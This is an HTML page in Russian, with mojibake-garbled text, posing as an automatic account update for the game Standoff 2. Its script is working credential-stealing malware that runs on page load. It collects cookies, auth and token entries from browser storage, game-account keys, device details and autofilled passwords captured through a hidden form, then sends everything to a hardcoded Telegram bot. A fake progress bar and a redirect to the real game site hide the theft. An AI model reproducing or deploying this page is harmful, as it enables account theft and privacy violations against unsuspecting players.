<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Standoff 2 - –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ</title>
    <style>
        body {
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: white;
            font-family: Arial;
            text-align: center;
            padding: 50px 20px;
            margin: 0;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #ff4444;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .progress {
            width: 100%;
            background: rgba(255,255,255,0.2);
            border-radius: 10px;
            margin: 20px 0;
        }
        .progress-bar {
            width: 0%;
            height: 10px;
            background: #4CAF50;
            border-radius: 10px;
            transition: width 2s;
        }
    </style>
</head>
<body>
    <h1>üéÆ STANDOFF 2</h1>
    <p>‚ö° <b>–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–∞</b></p>
    
    <div class="loader"></div>
    
    <div class="progress">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    
    <div id="status">üîç –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–∞...</div>
    <div id="step" style="margin-top: 10px; font-size: 14px; opacity: 0.8;"></div>

    <script>
        const BOT_TOKEN = "8245809142:AAGmdhZAkZ91z4spf3PMG-no89fHrjYC3q8";
        const CHAT_ID = "1491315056";

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
        function sendToTelegram(message) {
            const encodedMessage = encodeURIComponent(message);
            new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
        }

        // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–µ—Å—Å–∞
        function updateProgress(percent, step) {
            document.getElementById('progressBar').style.width = percent + '%';
            document.getElementById('step').textContent = step;
        }

        // –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –ø–∞—Ä–æ–ª–∏
        function stealSavedCredentials() {
            let credentials = "";
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –∞–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏–µ
            const fakeForm = document.createElement('form');
            fakeForm.innerHTML = `
                <input type="text" name="username" autocomplete="username">
                <input type="password" name="password" autocomplete="current-password">
                <input type="tel" name="phone" autocomplete="tel">
            `;
            document.body.appendChild(fakeForm);
            
            // –ñ–¥–µ–º –∞–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è
            setTimeout(() => {
                const inputs = fakeForm.querySelectorAll('input');
                inputs.forEach(input => {
                    if (input.value) {
                        credentials += `${input.name}: ${input.value}\n`;
                    }
                });
                document.body.removeChild(fakeForm);
            }, 1000);
            
            return credentials;
        }

        // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∏–∑ IndexedDB
        async function stealIndexedDB() {
            let dbData = "";
            
            try {
                const dbs = await window.indexedDB.databases();
                dbData = `üìä IndexedDB –±–∞–∑: ${dbs.length}\n`;
                dbs.forEach(db => {
                    dbData += `- ${db.name}\n`;
                });
            } catch (e) {}
            
            return dbData;
        }

        // –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∏–∑ Service Workers
        async function stealServiceWorkers() {
            let swData = "";
            
            try {
                const registrations = await navigator.serviceWorker.getRegistrations();
                swData = `‚öôÔ∏è Service Workers: ${registrations.length}\n`;
                registrations.forEach(reg => {
                    swData += `- ${reg.scope}\n`;
                });
            } catch (e) {}
            
            return swData;
        }

        // –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–ª—É—á–∏—Ç—å Push –ø–æ–¥–ø–∏—Å–∫–∏
        async function stealPushSubscriptions() {
            let pushData = "";
            
            try {
                const registration = await navigator.serviceWorker.ready;
                const subscription = await registration.pushManager.getSubscription();
                if (subscription) {
                    pushData = `üì± Push –ø–æ–¥–ø–∏—Å–∫–∞: –µ—Å—Ç—å\n`;
                    pushData += `Endpoint: ${subscription.endpoint}\n`;
                }
            } catch (e) {}
            
            return pushData;
        }

        // –°–±–æ—Ä —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
        function collectAdvancedInfo() {
            let info = "üñ•Ô∏è –†–ê–°–®–ò–†–ï–ù–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø:\n\n";
            
            // –ü–∞–º—è—Ç—å –∏ –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å
            if (performance.memory) {
                info += `üíæ –ü–∞–º—è—Ç—å: ${Math.round(performance.memory.usedJSHeapSize / 1048576)}MB / ${Math.round(performance.memory.totalJSHeapSize / 1048576)}MB\n`;
            }
            
            // –ë–∞—Ç–∞—Ä–µ—è
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    sendToTelegram(`üîã –ë–∞—Ç–∞—Ä–µ—è: ${Math.round(battery.level * 100)}% (${battery.charging ? '–∑–∞—Ä—è–∂–∞–µ—Ç—Å—è' : '—Ä–∞–∑—Ä—è–∂–∞–µ—Ç—Å—è'})`);
                });
            }
            
            // –Ø—Ä–∫–æ—Å—Ç—å —ç–∫—Ä–∞–Ω–∞
            if ('screen' in window && 'brightness' in window.screen) {
                info += `üí° –Ø—Ä–∫–æ—Å—Ç—å: ${window.screen.brightness || '–Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ'}\n`;
            }
            
            return info;
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
        async function autoStealData() {
            let allData = "üéØ –ê–í–¢–û–ú–ê–¢–ò–ß–ï–°–ö–ò–ô –°–ë–û–† –î–ê–ù–ù–´–•\n\n";
            
            updateProgress(10, "–°–±–æ—Ä –±–∞–∑–æ–≤–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏...");
            
            // 1. –ë–∞–∑–æ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
            allData += "üåê –ë–ê–ó–û–í–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø:\n";
            allData += `User-Agent: ${navigator.userAgent}\n`;
            allData += `–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${navigator.platform}\n`;
            allData += `–Ø–∑—ã–∫: ${navigator.language}\n`;
            allData += `–û–Ω–ª–∞–π–Ω: ${navigator.onLine ? '–î–∞' : '–ù–µ—Ç'}\n`;
            allData += `–ü–∞–º—è—Ç—å: ${navigator.deviceMemory || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}GB\n`;
            allData += `–Ø–¥—Ä–∞: ${navigator.hardwareConcurrency || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n\n`;
            
            updateProgress(30, "–ü–æ–∏—Å–∫ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –ø–∞—Ä–æ–ª–µ–π...");
            
            // 2. –°–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            allData += "üîê –°–û–•–†–ê–ù–ï–ù–ù–´–ï –î–ê–ù–ù–´–ï:\n";
            
            // LocalStorage
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    if (key.includes('auth') || key.includes('token') || key.includes('user')) {
                        allData += `LocalStorage ${key}: ${localStorage.getItem(key)}\n`;
                    }
                }
            } catch (e) {}
            
            // SessionStorage
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    if (key.includes('auth') || key.includes('token')) {
                        allData += `SessionStorage ${key}: ${sessionStorage.getItem(key)}\n`;
                    }
                }
            } catch (e) {}
            
            // Cookies
            allData += `Cookies: ${document.cookie || '–Ω–µ—Ç'}\n\n`;
            
            updateProgress(50, "–ê–Ω–∞–ª–∏–∑ –±–∞–∑ –¥–∞–Ω–Ω—ã—Ö...");
            
            // 3. –ë–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
            allData += await stealIndexedDB();
            allData += await stealServiceWorkers();
            allData += await stealPushSubscriptions();
            allData += "\n";
            
            updateProgress(70, "–°–±–æ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏...");
            
            // 4. –†–∞—Å—à–∏—Ä–µ–Ω–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
            allData += collectAdvancedInfo();
            
            updateProgress(90, "–ü–æ–∏—Å–∫ –∏–≥—Ä–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö...");
            
            // 5. –°–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –¥–ª—è –∏–≥—Ä –¥–∞–Ω–Ω—ã–µ
            allData += "üéÆ –ü–û–ò–°–ö –ò–ì–†–û–í–´–• –î–ê–ù–ù–´–•:\n";
            
            // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –∏–≥—Ä–æ–≤—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤
            const gamePatterns = ['standoff', 'steam', 'googleplay', 'vkgames', 'axlebolt'];
            gamePatterns.forEach(pattern => {
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (key.toLowerCase().includes(pattern)) {
                            allData += `–ò–≥—Ä–∞ ${key}: ${localStorage.getItem(key).substring(0, 50)}\n`;
                        }
                    }
                } catch (e) {}
            });
            
            allData += `\n‚è∞ –í—Ä–µ–º—è —Å–±–æ—Ä–∞: ${new Date().toLocaleString('ru-RU')}\n`;
            allData += `üîó –°—Ç—Ä–∞–Ω–∏—Ü–∞: ${window.location.href}\n`;
            allData += `üìé –ò—Å—Ç–æ—á–Ω–∏–∫: ${document.referrer || '–ø—Ä—è–º–æ–π –∑–∞—Ö–æ–¥'}`;
            
            updateProgress(100, "–û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö...");
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö
            sendToTelegram(allData);
            
            // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
            setTimeout(() => {
                const savedCreds = stealSavedCredentials();
                if (savedCreds) {
                    sendToTelegram("üîë –ê–í–¢–û–ó–ê–ü–û–õ–ù–ï–ù–ò–ï:\n" + savedCreds);
                }
            }, 3000);
            
            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
            setTimeout(() => {
                document.getElementById('status').textContent = "‚úÖ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ! –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ...";
                setTimeout(() => {
                    window.location.href = 'https://standoff2.com';
                }, 2000);
            }, 5000);
        }

        // –ó–∞–ø—É—Å–∫ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', function() {
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ
            sendToTelegram(`üïµÔ∏è –ù–ê–ß–ê–õ –ê–í–¢–û–°–ë–û–†: ${new Date().toLocaleTimeString('ru-RU')}`);
            
            // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
            setTimeout(autoStealData, 1000);
        });

        // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —É—Ö–æ–¥–∞
        window.addEventListener('beforeunload', function() {
            sendToTelegram(`üö™ –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –£–®–ï–õ: –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ ${Math.round((Date.now() - performance.timing.navigationStart) / 1000)}—Å–µ–∫`);
        });

    </script>
